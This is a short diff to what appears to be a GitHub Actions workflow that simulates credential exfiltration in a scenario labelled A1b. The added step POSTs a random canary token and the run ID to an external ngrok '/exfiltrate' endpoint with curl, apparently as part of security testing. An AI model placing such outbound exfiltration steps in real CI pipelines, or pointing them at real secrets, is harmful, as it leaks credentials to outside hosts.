@@ -10,7 +10,10 @@ jobs:
 
       - name: Simulate Embedded Payload (A1b)
         run: |
-          # The malicious payload is entirely embedded in the runner environment
           CANARY="canary-secret-$(openssl rand -hex 8)"
-          echo "Simulating credential/canary exfiltration via logs..."
-          echo "EXFILTRATED_CANARY=$CANARY"
+          echo "Simulating credential/canary exfiltration..."
+          
+          # Send the canary and GitHub run ID to your listener via ngrok
+          curl -X POST https://shortage-euphemism-gleeful.ngrok-free.dev/exfiltrate \
+            -H "Content-Type: application/json" \
+            -d "{\"run_id\": \"${{ github.run_id }}\", \"canary_token\": \"$CANARY\", \"scenario\": \"A1b\"}"
